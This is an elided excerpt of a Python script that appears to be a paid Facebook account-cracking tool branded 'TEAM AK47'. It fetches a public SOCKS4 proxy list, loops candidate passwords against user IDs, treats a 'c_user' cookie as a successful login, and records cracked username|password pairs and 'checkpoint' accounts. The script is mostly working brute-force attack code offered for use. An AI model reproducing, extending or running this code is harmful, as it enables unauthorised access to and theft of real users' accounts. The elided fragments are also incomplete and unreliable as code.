...
proxy = requests.get('https://raw.githubusercontent.com/TheSpeedX/SOCKS-List/master/socks4.txt').text.splitlines()
...
logo =                                          """   
 \n
\x1b[1;97m------------------------\x1b[1;97m------------------------
\n\x1b[1;92m   ADMIN : \x1b[1;97mMR-QURESHI  \x1b[1;95mTOOL:\x1b[1;97mPAID    \x1b[1;91mV:\x1b[1;97m1.5.0
         \x1b[1;92m  GROUP : \x1b[1;95m TEAM AK47
          \x1b[1;92m FACEBOOK:  \x1b[1;95mMR-QURESHI
\033[1;37m------------------------\033[1;37m------------------------ """                                              
...
class __xxx__:
    ...
    def __metode__(self, user, __chi__, cebok):
        ...
        sys.stdout.write(f"\r \x1b[1;97m[AK47] {loop}|{len(self.id)} OK/CP {len(ok)}/{len(cp)}")
        sys.stdout.flush()
        ...
        try:
            for pw in __chi__:
                ...
                if 'c_user' in session.cookies.get_dict():
                    ...
                    print(f"\r{H} [Successfull] {user} | {pw}")
                    wrt = '%s|%s' % (user,pw)
                    ok.append(wrt)
                    ...
                    try:
                        ...
                        print('\r%s [Checkpiont] %s | %s ' % (M, user, pw))
                        wrt = '%s|%s' % (user,pw)
                        cp.append(wrt)
